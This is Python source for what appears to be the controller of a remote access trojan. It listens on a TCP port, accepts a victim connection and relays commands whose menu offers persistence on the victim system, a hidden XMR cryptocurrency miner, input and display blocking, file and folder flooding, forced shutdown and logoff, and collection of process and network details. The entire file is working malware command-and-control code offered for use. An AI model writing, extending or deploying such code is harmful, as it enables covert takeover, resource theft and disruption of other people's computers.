import socket,os
from colorama import Fore

os.system("cls")

# Globals
IP = "192.168.178.185"
PORT = 8888
DATA = 16384

print(Fore.RED+"""
   ▄▄▄▄▄   ▄███▄   █▄▄▄▄    ▄   ▄███▄   █▄▄▄▄
  █     ▀▄ █▀   ▀  █  ▄▀     █  █▀   ▀  █  ▄▀
▄  ▀▀▀▀▄   ██▄▄    █▀▀▌ █     █ ██▄▄    █▀▀▌
 ▀▄▄▄▄▀    █▄   ▄▀ █  █  █    █ █▄   ▄▀ █  █
           ▀███▀     █    █  █  ▀███▀     █
                    ▀      █▐            ▀
                           ▐
""")

servermain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servermain.bind((IP, PORT))
servermain.listen(1)
client, clientaddr = servermain.accept()
print(f"[*] Got A Connection from {clientaddr}.")
print("""
* = Requires Admin.
• Volup. Turns The Clients Volume Up By 2 Percent.
• Voldown. Decreases The Clients Volume By 2 Percent.
• Persist. Makes The Client File Persist On The System.
• Mine. Starts A Powerfull XMR Miner On The Clients System.
• Cd. Changes The CWD.
• Dir. Shows All The Files In A Location.
• Shutdown. Shuts The Clients System Off.
• Blockinput. Blocks The Clients Input. *
• Unblockinput. Unblocks The Clients Input. *
• Displayoff. Turns The Client Display Off. *
• Displayon. Turns The Client Display On. *
• Getos. Gets Info About The PC.
• Folderflood. Makes 1 To 100 New Folders In The CWD.
• Fileflood. Makes 1 To 100 New Files In The CWD.
• Restart. Restarts The Clients System
• Netinfo. Shows The Clients [IP Address, MAC Address, Netmask].
• Logoff. Logs The Client Out Of The PC.
• Getproc. Gets All The Running Processes.
""")

while True:
    try:
        cmd = input("$")
        if cmd[:2] == "cd":
            os.chdir(cmd[3:])
        if cmd == "exit":
            client.close()
            servermain.close()
            break
        if len(cmd) > 0:
            client.send(cmd.encode())
            client_response = str(client.recv(DATA),"utf-8")
            print(client_response, end="")
    except Exception as e:
        print("[!] Error running command: ",e)